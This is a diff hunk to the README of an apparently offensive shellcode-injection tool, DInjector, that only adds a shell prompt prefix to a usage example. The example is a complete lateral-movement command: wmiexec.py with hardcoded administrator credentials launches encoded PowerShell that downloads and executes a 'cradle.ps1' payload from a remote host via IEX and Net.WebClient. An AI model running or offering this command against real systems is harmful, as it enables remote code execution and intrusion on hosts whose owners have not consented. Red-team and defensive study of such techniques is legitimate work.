@@ -96,7 +96,7 @@ references:
 :information_source: When loading the cradle from a semi-interactive shell, use `Invoke-WmiMethod` to spawn a new PowerShell process. Example with [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py):
 
 ```bash
-wmiexec.py -silentcommand -nooutput administrator:'Passw0rd!'@192.168.1.11 "powershell -enc $(echo -n 'Invoke-WmiMethod Win32_Process -Name Create -ArgumentList ("powershell -enc '`echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`'")' | iconv -t UTF-16LE | base64 -w0)"
+~$ wmiexec.py -silentcommand -nooutput administrator:'Passw0rd!'@192.168.1.11 "powershell -enc $(echo -n 'Invoke-WmiMethod Win32_Process -Name Create -ArgumentList ("powershell -enc '`echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`'")' | iconv -t UTF-16LE | base64 -w0)"
 ```
 
 ### [FunctionPointerV2](/DInjector/Modules/FunctionPointerV2.cs)
